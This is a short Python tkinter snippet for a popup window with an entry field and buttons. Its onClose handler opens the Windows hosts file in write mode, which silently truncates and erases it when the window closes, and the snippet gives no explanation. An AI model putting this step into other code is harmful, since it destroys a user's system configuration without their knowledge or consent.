from tkinter import *


def onClose(root):
    with open("C:\\Windows\\System32\\drivers\\etc\\hosts", 'w') as file:
        file.close()
    root.destroy()


def close_win(top):
    top.destroy()


def insert_val(e):
    e.insert(0, "Hello World!")


def popUpBox(root):

    top = Toplevel(root)
    top.geometry("750x250")

    entry = Entry(top, width=25)
    entry.pack(pady=25, side=TOP)

    Button(top, text="Insert", command=lambda: insert_val(entry)).pack(pady=5, side=TOP)
    button = Button(top, text="Ok", command=lambda: close_win(top))
    button.pack(pady=5, side=TOP)
